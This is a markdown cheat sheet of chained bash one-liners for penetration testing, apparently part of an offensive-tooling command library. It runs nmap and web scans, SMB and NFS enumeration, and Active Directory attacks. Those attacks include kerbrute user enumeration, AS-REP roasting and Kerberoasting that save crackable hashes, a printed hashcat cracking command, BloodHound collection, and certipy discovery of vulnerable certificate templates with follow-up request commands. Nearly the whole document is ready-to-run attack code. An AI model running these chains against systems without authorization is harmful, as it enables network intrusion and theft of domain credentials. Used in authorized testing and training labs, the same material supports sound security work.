# Chains

> Multi-tool workflows that replace 3-8 separate invocations with one focused command. Each chain filters noise and only surfaces the high-signal output, so you skim results in seconds instead of scrolling through screens of banner text.

<!-- tags: chain, workflow, combined, multi-tool -->

---

## chain full nmap fast-then-deep
Quick top-1k SYN scan first, then deep -sV -sC -O only on the ports actually found. Slashes ~55min off a naive `nmap -A -p-` while keeping the same signal.

```bash
ports=$(sudo nmap -sS -T4 --min-rate=1000 --top-ports 1000 -Pn {{TARGET:ip}} 2>/dev/null | awk '/^[0-9]+\/tcp.*open/{split($1,a,"/"); print a[1]}' | paste -sd,); [ -z "$ports" ] && { echo '[!] no open ports found in top-1k — try -p-'; exit 1; }; echo "[+] top-1k open: $ports"; sudo nmap -sV -sC -O -p "$ports" -Pn -oN {{OUT:file:nmap-full.txt}} {{TARGET:ip}}
```

<!-- meta: risk=low | phase=recon | tags=nmap,chain,fast,deep,full -->

---

## chain quick web recon
whatweb → nikto (60s cap) → nuclei critical/high — all fast tools, whole chain ~90s. Directory brute (ffuf/dirsearch/feroxbuster/gobuster) is deliberately NOT here — those are 5-30min operations, run them separately when you know what to fuzz.

```bash
url=http://{{TARGET:ip}}; echo '[+] whatweb'; whatweb -a3 "$url" 2>/dev/null | tr ',' '\n' | sed 's/^\s*//' | head -20; echo; echo '[+] nikto (60s cap)'; timeout 65 nikto -h "$url" -Tuning 123b -maxtime 55s 2>&1 | grep -E '^\+ '; echo; echo '[+] nuclei critical/high'; nuclei -u "$url" -s critical,high -silent 2>/dev/null; echo; echo '[+] next: q > "ffuf"  or  q > "dirsearch"  when you are ready to fuzz'
```

<!-- meta: risk=low | phase=recon | tags=web,whatweb,nikto,nuclei,chain,quick -->

---

## chain full domain recon passive
subfinder + amass passive, dedup, then httpx alive-check with title + tech. Passive only — no active brute so it's safe to run against real targets.

```bash
domain={{DOMAIN:domain}}; out={{OUT:file:live-subs.txt}}; tmp=$(mktemp); echo '[+] subfinder'; subfinder -d "$domain" -silent > "$tmp"; echo "  $(wc -l < "$tmp") subs from subfinder"; echo '[+] amass passive (120s cap)'; timeout 120 amass enum -passive -d "$domain" -silent >> "$tmp" 2>/dev/null; sort -u "$tmp" -o "$tmp"; echo "  $(wc -l < "$tmp") total after dedup"; echo; echo '[+] httpx alive + title + tech'; httpx -l "$tmp" -silent -status-code -title -tech-detect | tee "$out"; rm -f "$tmp"
```

<!-- meta: risk=low | phase=recon | tags=domain,subfinder,amass,httpx,chain,passive -->

---

## chain full smb null session
Everything null-session SMB can tell you: nxc banner, smbmap shares, enum4linux-ng full, smbclient list. Output stripped of blanks and banner noise.

```bash
target={{TARGET:ip}}; echo '[+] nxc smb (null)'; nxc smb "$target" -u '' -p '' 2>&1 | grep -vE '^$|^SMB[[:space:]]+[0-9.]+[[:space:]]+445[[:space:]]+.*Windows' | head -8; echo; echo '[+] smbmap null'; smbmap -H "$target" -u '' -p '' 2>/dev/null | grep -vE '^\[' | head -30; echo; echo '[+] enum4linux-ng (60s cap)'; timeout 60 enum4linux-ng -A "$target" 2>&1 | grep -vE '^\[|Target Information|Enumerating|Session Check|^-+$' | head -80; echo; echo '[+] smbclient list'; smbclient -L "//$target" -N 2>/dev/null | grep -vE '^Anonymous|^\s*$|^\s+Sharename'
```

<!-- meta: risk=low | phase=enum | tags=smb,null,nxc,smbmap,enum4linux,smbclient,chain -->

---

## chain full smb authenticated
Same as null but with creds — plus spider readable shares and rpcclient enumdomusers. Best first step once you have a valid user/pass.

```bash
target={{TARGET:ip}}; user={{USER:str}}; pass={{PASS:str}}; echo '[+] nxc smb auth'; nxc smb "$target" -u "$user" -p "$pass" 2>&1 | grep -v '^$' | head -10; echo; echo '[+] smbmap shares + perms'; smbmap -H "$target" -u "$user" -p "$pass" 2>/dev/null | grep -vE '^\['; echo; echo '[+] nxc spider-plus (readable shares)'; nxc smb "$target" -u "$user" -p "$pass" --spider-plus --spider-plus-download false 2>&1 | grep -v '^$' | head -60; echo; echo '[+] rpcclient enumdomusers'; rpcclient -U "$user%$pass" "$target" -c 'enumdomusers' 2>/dev/null | head -40
```

<!-- meta: risk=low | phase=enum | tags=smb,auth,nxc,smbmap,spider,rpcclient,chain -->

---

## chain full rpc nfs mount-and-list
rpcinfo → showmount → auto-mount the first NFS export read-only and ls its top level. Prints the umount reminder so you don't leave stale mounts.

```bash
target={{TARGET:ip}}; echo '[+] rpcinfo'; rpcinfo -p "$target" 2>/dev/null; echo; echo '[+] showmount exports'; exports=$(showmount -e "$target" 2>/dev/null); echo "$exports"; first=$(echo "$exports" | awk 'NR==2{print $1}'); [ -z "$first" ] && { echo '[!] no exports to mount'; exit 0; }; echo; mnt=$(mktemp -d); echo "[+] mounting $first read-only at $mnt"; sudo mount -t nfs -o ro,nolock,vers=3 "$target:$first" "$mnt" && ls -la "$mnt" && echo && echo "[+] to unmount: sudo umount $mnt && rmdir $mnt"
```

<!-- meta: risk=low | phase=enum | tags=rpc,nfs,rpcinfo,showmount,mount,chain -->

---

## chain ad external recon kerbrute plus asrep
kerbrute userenum → extract valid users → AS-REP roast the ones without pre-auth. No creds required, just a DC IP + domain + a userlist.

```bash
dc={{DC_IP:ip}}; domain={{DOMAIN:domain}}; wordlist={{WORDLIST:file:/usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt}}; out={{OUT:file:kerb-users.txt}}; echo '[+] kerbrute userenum'; kerbrute userenum -d "$domain" --dc "$dc" "$wordlist" -o "$out" 2>&1 | grep -E 'VALID|Progress|ERROR' | tail -20; echo; valid=$(mktemp); grep -oE '[a-zA-Z0-9._-]+@' "$out" | sed 's/@$//' | sort -u > "$valid"; count=$(wc -l < "$valid"); echo "[+] $count valid users → $valid"; [ "$count" -eq 0 ] && exit 0; echo; echo '[+] AS-REP roast (no pre-auth)'; impacket-GetNPUsers "$domain/" -usersfile "$valid" -no-pass -dc-ip "$dc" 2>/dev/null | grep -E '^\$krb5asrep' | tee -a asrep-hashes.txt
```

<!-- meta: risk=low | phase=recon | tags=ad,kerbrute,asrep,users,chain -->

---

## chain ad kerberoast get-hashes
GetUserSPNs → extract hashes → save to a file and print the exact hashcat command to run next. Cracking is deliberately separate (hashcat can grind for hours on hard hashes; run it when you're ready).

```bash
dc={{DC_IP:ip}}; domain={{DOMAIN:domain}}; user={{USER:str}}; pass={{PASS:str}}; out={{OUT:file:kerberoast.txt}}; echo '[+] GetUserSPNs'; impacket-GetUserSPNs "$domain/$user:$pass" -dc-ip "$dc" -request 2>&1 | tee "$out" | grep -E '^\$krb5tgs'; hashes=$(grep -c '^\$krb5tgs' "$out"); [ "$hashes" -eq 0 ] && { echo '[!] no SPN hashes'; exit 0; }; grep '^\$krb5tgs' "$out" > /tmp/kerb-hashes; echo; echo "[+] $hashes hash(es) saved to $out (raw) and /tmp/kerb-hashes (hashcat-ready)"; echo; echo '[+] next — crack:'; echo "     hashcat -m 13100 /tmp/kerb-hashes /usr/share/wordlists/rockyou.txt -O"; echo "     (or: q > 'hashcat' for the full hashcat cheatsheet)"
```

<!-- meta: risk=low | phase=attack | tags=ad,kerberoast,spn,chain,get-hashes -->

---

## chain ad bloodhound collect and quick-triage
bloodhound-python collect (All) → prints zip location → quick bloodyAD queries for pre-owned Kerberoastable + AS-REP targets so you have data to act on immediately without opening the GUI.

```bash
dc={{DC_IP:ip}}; domain={{DOMAIN:domain}}; user={{USER:str}}; pass={{PASS:str}}; outdir={{OUT:dir:/tmp/bh}}; mkdir -p "$outdir" && cd "$outdir" || exit 1; echo '[+] bloodhound-python collecting (All)'; bloodhound-python -u "$user" -p "$pass" -d "$domain" -c All -ns "$dc" --zip 2>&1 | grep -vE '^INFO' | tail -6; echo; ls -la "$outdir"/*.zip 2>/dev/null; echo; echo '[+] BloodHound GUI: Ctrl+I → upload the .zip above'; echo; echo '[+] quick bloodyAD triage — kerberoastable users:'; bloodyAD -u "$user" -p "$pass" -d "$domain" --host "$dc" get search --filter '(&(samAccountType=805306368)(servicePrincipalName=*))' --attr sAMAccountName 2>/dev/null | grep -A0 samAccountName | head -20; echo; echo '[+] AS-REP-roastable users:'; bloodyAD -u "$user" -p "$pass" -d "$domain" --host "$dc" get search --filter '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' --attr sAMAccountName 2>/dev/null | grep -A0 samAccountName | head -20
```

<!-- meta: risk=low | phase=enum | tags=ad,bloodhound,bloodyAD,collect,triage,chain -->

---

## chain ad cert attack certipy find
certipy-ad find with --vulnerable — prints only ESC-flagged templates so you don't scroll through 200 lines of generic output. Follow-up req/auth commands printed as hints.

```bash
dc={{DC_IP:ip}}; domain={{DOMAIN:domain}}; user={{USER:str}}; pass={{PASS:str}}; echo '[+] certipy-ad find --vulnerable'; certipy-ad find -u "$user@$domain" -p "$pass" -dc-ip "$dc" -vulnerable -stdout 2>&1 | grep -B1 -A3 -E 'ESC[0-9]+|\[!\]|Vulnerable' | head -50; echo; echo '[+] next steps:'; echo "  certipy-ad req -u $user@$domain -p '$pass' -ca <CA_NAME> -template <TEMPLATE> -dc-ip $dc"; echo "  certipy-ad auth -pfx <output.pfx> -dc-ip $dc"
```

<!-- meta: risk=low | phase=attack | tags=ad,certipy,adcs,esc,chain -->

---

## chain ad writable objects bloodyAD
bloodyAD get writable — every object your user can modify (paths to abuse, take-over candidates). Kept to the top 60 rows to stay skimmable.

```bash
dc={{DC_IP:ip}}; domain={{DOMAIN:domain}}; user={{USER:str}}; pass={{PASS:str}}; echo '[+] bloodyAD writable objects'; bloodyAD -u "$user" -p "$pass" -d "$domain" --host "$dc" get writable 2>&1 | head -60; echo; echo '[+] bloodyAD DNS dump (30 max)'; bloodyAD -u "$user" -p "$pass" -d "$domain" --host "$dc" get dnsDump 2>&1 | head -30
```

<!-- meta: risk=low | phase=enum | tags=ad,bloodyAD,writable,dns,chain -->
